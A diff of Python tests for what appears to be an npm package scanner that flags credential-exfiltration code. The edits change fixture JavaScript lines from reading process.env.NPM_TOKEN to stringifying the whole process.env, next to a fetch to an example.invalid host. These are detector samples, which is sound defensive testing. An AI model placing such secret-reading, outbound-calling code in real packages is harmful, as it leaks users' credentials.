@@ -89,14 +89,14 @@ def test_observations_ignore_version_lines_comments_and_spacing(tmp_path: Path) 
     base = _snapshot(
         tmp_path / "base",
         files={
-            "package/index.js": 'const token=process.env.NPM_TOKEN; fetch("https://example.invalid/status");',
+            "package/index.js": 'const token=JSON.stringify(process.env); fetch("https://example.invalid/status");',
         },
     )
     head = _snapshot(
         tmp_path / "head",
         version="1.1.0",
         files={
-            "package/index.js": '\n// Formatting only.\nconst token = process . env . NPM_TOKEN;\n\nfetch(\n "https://example.invalid/status"\n);\n',
+            "package/index.js": '\n// Formatting only.\nconst token = JSON . stringify( process . env );\n\nfetch(\n "https://example.invalid/status"\n);\n',
         },
     )
     base_profile = inspect_snapshot(base)
@@ -108,14 +108,14 @@ def test_observations_ignore_version_lines_comments_and_spacing(tmp_path: Path) 
 
 
 def test_unrelated_statement_edit_does_not_change_risk_observation(tmp_path: Path) -> None:
-    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/status");\n'
+    source = 'const token = JSON.stringify(process.env); fetch("https://example.invalid/status");\n'
     base = _snapshot(tmp_path / "base", files={"package/index.js": source + "const harmless=1;"})
     head = _snapshot(tmp_path / "head", files={"package/index.js": source + "const harmless=2;"})
     assert _facts(base) == _facts(head)
 
 
 def test_relevant_literal_changes_change_observation(tmp_path: Path) -> None:
-    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/{path}");'
+    source = 'const token = JSON.stringify(process.env); fetch("https://example.invalid/{path}");'
     base = _snapshot(tmp_path / "base", files={"package/index.js": source.replace("{path}", "one")})
     head = _snapshot(tmp_path / "head", files={"package/index.js": source.replace("{path}", "two")})
     key = ("code_observation", "npm-credential-exfiltration:index.js")
@@ -123,7 +123,7 @@ def test_relevant_literal_changes_change_observation(tmp_path: Path) -> None:
 
 
 def test_repeated_observation_is_not_lost(tmp_path: Path) -> None:
-    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/status");'
+    source = 'const token = JSON.stringify(process.env); fetch("https://example.invalid/status");'
     base = _snapshot(tmp_path / "base", files={"package/index.js": source})
     head = _snapshot(
         tmp_path / "head",
@@ -456,7 +456,7 @@ def test_extensionless_node_bin_is_inspected(tmp_path: Path) -> None:
                 "bin": "bin/example",
             },
             files={
-                "package/bin/example": '#!/usr/bin/env node\nconst token = process.env.NPM_TOKEN; fetch("https://example.invalid/status");'
+                "package/bin/example": '#!/usr/bin/env node\nconst token = JSON.stringify(process.env); fetch("https://example.invalid/status");'
             },
         )
     )
@@ -497,7 +497,9 @@ def test_nonstring_manifest_name_is_untrusted(tmp_path: Path) -> None:
 
 
 def test_observation_preview_is_bounded_and_full_digest_detects_later_edits(tmp_path: Path) -> None:
-    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/' + "a" * 1000
+    source = (
+        'const token = JSON.stringify(process.env); fetch("https://example.invalid/' + "a" * 1000
+    )
     base = _snapshot(tmp_path / "base", files={"package/index.js": source + 'one");'})
     head = _snapshot(tmp_path / "head", files={"package/index.js": source + 'two");'})
     key = ("code_observation", "npm-credential-exfiltration:index.js")
